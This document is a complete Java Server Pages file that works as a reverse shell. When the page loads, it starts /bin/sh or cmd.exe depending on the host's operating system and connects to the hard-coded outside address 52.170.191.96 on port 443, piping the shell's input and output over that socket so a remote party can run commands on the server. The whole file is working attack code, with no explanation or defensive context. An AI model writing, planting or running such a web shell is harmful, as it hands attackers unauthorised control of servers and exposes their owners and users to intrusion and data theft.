<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream li;
    OutputStream ir;

    StreamConnector( InputStream li, OutputStream ir )
    {
      this.li = li;
      this.ir = ir;
    }

    public void run()
    {
      BufferedReader xn  = null;
      BufferedWriter pjn = null;
      try
      {
        xn  = new BufferedReader( new InputStreamReader( this.li ) );
        pjn = new BufferedWriter( new OutputStreamWriter( this.ir ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = xn.read( buffer, 0, buffer.length ) ) > 0 )
        {
          pjn.write( buffer, 0, length );
          pjn.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( xn != null )
          xn.close();
        if( pjn != null )
          pjn.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "52.170.191.96", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
